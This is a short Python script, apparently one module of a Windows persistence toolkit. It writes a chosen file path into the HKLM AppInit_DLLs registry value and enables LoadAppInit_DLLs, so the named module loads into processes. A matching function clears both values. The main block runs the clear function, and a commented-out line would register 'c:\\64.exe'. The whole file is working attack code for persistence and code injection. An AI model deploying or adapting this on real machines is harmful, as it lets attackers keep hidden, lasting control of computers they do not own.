#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.05
# @Author  : Lhaihai
# @File    : AppInit_DLLs
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : 
"""

import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('AppInit_DLLs')

def set_AppInit_DLLs(cmd):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        try:
            reg.create_value('AppInit_DLLs', pyregedit.REG_SZ, cmd)
            reg.create_value('LoadAppInit_DLLs', pyregedit.REG_DWORD, 0x01)
            logger.info('插入注册表成功')
        except:
            logger.error('插入注册表失败')
    else:
        logger.info('需要管理员权限！')
        return



def clear_AppInit_DLLs():
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        reg.create_value('AppInit_DLLs', pyregedit.REG_SZ, "")
        reg.create_value('LoadAppInit_DLLs', pyregedit.REG_DWORD, 0x0)
        logger.info('清除')
    else:
        logger.info('需要管理员权限！')
        return


if __name__ == '__main__':
    # set_AppInit_DLLs('c:\\64.exe')
    clear_AppInit_DLLs()